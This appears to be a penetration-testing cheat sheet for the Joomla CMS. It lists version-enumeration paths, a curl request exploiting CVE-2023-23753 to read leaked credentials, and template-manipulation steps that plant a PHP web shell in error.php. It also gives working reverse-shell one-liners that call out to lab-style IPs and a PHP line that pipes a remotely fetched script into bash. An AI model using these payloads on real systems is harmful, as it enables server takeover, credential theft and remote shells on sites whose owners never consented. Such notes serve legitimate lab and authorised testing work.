---
icon: folder-grid
description: Content Management System
---

# Joomla

{% hint style="info" %}
<mark style="color:purple;">Documentation</mark>
{% endhint %}

{% embed url="https://docs.joomla.org/" %}

***

{% hint style="info" %}
## <mark style="color:purple;">Enumeration</mark>

### <mark style="color:purple;">Find the Version</mark>:

* <mark style="color:orange;">**`1.0 to 1.5`**</mark> <mark style="color:purple;">**->**</mark>**&#x20;**<mark style="color:red;">**`includes/version.php`**</mark>&#x20;
* <mark style="color:orange;">**`1.6 to 3.x`**</mark>**&#x20;**<mark style="color:purple;">**->**</mark>  <mark style="color:red;">**`administrator/manifests/files/joomla.xml`**</mark>
* <mark style="color:orange;">**`4.x`**</mark> <mark style="color:purple;">-></mark> <mark style="color:red;">**`administrator/manifests/files/joomla.xml`**</mark>

<mark style="color:orange;">**`Recommended`**</mark><mark style="color:purple;">: Use the admin interface or the</mark> <mark style="color:orange;">**`Joomla\CMS\Version`**</mark> <mark style="color:purple;">class programmatically.</mark>

***
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Vulnerabilities</mark>

### <mark style="color:orange;">`CVE-2023-23753`</mark> <mark style="color:orange;"></mark><mark style="color:orange;">-</mark> <mark style="color:red;">`4.0.0 to 4.2.7`</mark>

* <mark style="color:purple;">Read about it</mark> [<mark style="color:orange;">**`here`**</mark>](https://vulncheck.com/blog/joomla-for-rce)
* <mark style="color:purple;">Credentials leak in plain text here:</mark>

{% code overflow="wrap" %}
```bash
curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">Template Manipulation</mark>

* <mark style="color:purple;">Navigate to</mark> <mark style="color:orange;">**`site templates`**</mark>
* <mark style="color:purple;">Look for writable files (Normally</mark> <mark style="color:orange;">**`error.php`**</mark> <mark style="color:purple;">is a good one to look at)</mark>
* <mark style="color:purple;">Add this code at the beginning of the file:</mark>

{% code overflow="wrap" %}
```php
if (isset($_REQUEST['tokyo'])) {
  system($_REQUEST['tokyo']);
  die();
}
```
{% endcode %}

* <mark style="color:purple;">Visiting a page that doesn't exist will raise a error page, if the argument passed is</mark> <mark style="color:orange;">**`tokyo`**</mark><mark style="color:purple;">, it will be run with</mark> <mark style="color:orange;">**`system`**</mark> <mark style="color:purple;">; allowing to code execution:</mark>

```url
/nonexistentsite?tokyo=id
```

* <mark style="color:purple;">From here you can spawn a</mark> <mark style="color:orange;">**`reverse shell`**</mark> <mark style="color:purple;">by passing it as an argument:</mark>

```url
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.6/4444+0>%261'
```

***

* <mark style="color:purple;">Alternatively, you can write the reverse shell directly on the template:</mark>

```php
<?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>
```

* <mark style="color:purple;">Then, create</mark> <mark style="color:orange;">**`rev.sh`**</mark>&#x20;

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
```
{% endcode %}

* <mark style="color:purple;">Setup a python web server, get your listener ready and trigger the</mark> <mark style="color:orange;">**`error.php`**</mark>
{% endhint %}

